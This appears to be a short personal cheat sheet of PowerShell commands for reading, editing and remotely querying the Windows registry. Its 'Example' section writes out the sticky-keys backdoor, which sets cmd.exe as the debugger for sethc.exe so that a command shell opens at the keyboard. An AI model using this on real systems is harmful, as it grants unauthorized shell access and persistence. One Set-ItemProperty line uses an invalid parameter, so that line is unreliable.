#### **How many provide we Have**

`Ps > Get-PSProvider Registry
`Ps > Get-PsDrive
#### **Get value data on registry**

*Note : `gi` is alias to `Get-item*

`Ps > gi "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion"
or
`Ps > Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion" | fl

#### **DIR the Registry**

`Ps > dir "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion"
`Ps > dir "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion" -Recurse
#### **Change Directory**

`Ps > cd registry::
`Ps > cd registry::HKEY_CLASSES_ROOT
`Ps Microsoft.PowerShell.Core\Registry::> ls
`Ps Microsoft.PowerShell.Core\Registry::> cd HKEY_CLASSES_ROOT
or 
`Ps > New-PSDrive -name HKCR -PSProvider Registry -Root Registry::HKEY_CLASSES_ROOT
`Ps > cd HKCR
`Ps > Get-PSDrive

#### **Registry Config**

*create folder*
`Ps > New-Item -Path HKLM:\PFTP 
*create property in folder*
`Ps > New-ItemProperty -Path HKLM:\PFTP -Name salam -PropertyType String -Value 2
*rename folder*
`Ps > Rename-Item HKLM:\PFTP -NewName adolf
*rename property in folder*
`Ps > Rename-ItemProperty HKLM:\PFTP -Name salam -NewName scezar
*Change value property in folder*
`Ps > set-ItemProperty -Path HKLM:\PFTP -Name scezar -Value 555 -PropertyType Dword

#### **Example**

`Ps > New-Item 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe'

`Ps > New-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe' -Name Debugger -PropertyType String -Value cmd.exe

*Note : now if u tap 5 time shift . the `cmd` run in current version*

#### **Registry on Remote Machine**

*method 1 : `PSRemoting`*
`PS > $mal_analysis = New-PSSession -ComputerName x.x.x.x -Credential domain\user
`PS > Enter-PSSession -Session $mal_analysis
`PS > icm -ScriptBlock {gi HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run} -Session $mal_analysis

*method 2 : `WMI`*
`PS > $RemoteReg = gwmi -List "StdRegProv" -ComputerName x.x.x.x -credential domain\user
`PS > $RemoteReg 
`PS > $RemoteReg | select -ExpandProperty Methods | more
`PS > $RemoteReg.GetStringValue(2147483650, "SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName")

```
   "HKCR" {$reg_hive = 2147483648}
   "HKCU" {$reg_hive = 2147483649}
   "HKLM" {$reg_hive = 2147483650}
   "HKUS" {$reg_hive = 2147483651}
   "HKCC" {$reg_hive = 2147483653}
```

